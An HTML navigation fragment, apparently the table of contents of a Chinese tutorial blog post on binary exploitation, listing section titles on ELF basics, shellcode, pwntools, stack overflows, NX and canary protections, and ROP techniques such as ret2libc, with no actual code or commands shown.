class="toc-nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">栈溢出基础</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">基本ROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2text"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">ret2text</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2shellcode"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">ret2shellcode</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2syscall"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">ret2syscall</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2libc"><span class="toc-nav-number">4.4.</span> <span class="toc-nav-text">ret2libc</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PLT%E5%92%8CGOT"><span class="toc-nav-number">4.5.</span> <span class="toc-nav-text">PLT和GOT</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">二进制基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">程序的编译与链接</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Linux%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8FELF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Linux下的可执行文件格式ELF</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%BF%9B%E7%A8%8B%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">进程虚拟地址空间</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">程序的装载与进程的执行</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">shellcode编写</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">pwntools使用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">pwndgb使用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">栈溢出基础</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">几种保护措施</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NX"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">NX</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Canary"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">Canary</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">基本ROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2text"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">ret2text</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2shellcode"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">ret2shellcode</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2syscall"><span class="toc-nav-number">7.3.</span> <span class="toc-nav-text">ret2syscall</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2libc"><span class="toc-nav-number">7.4.</span> <span class="toc-nav-text">ret2libc</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PLT%E5%92%8CGOT"><span class="toc-nav-number">7.5.</span> <span class="toc-nav-text">PLT和GOT</span></a></li></ol></li></ol>
         
         </div>
       </aside>
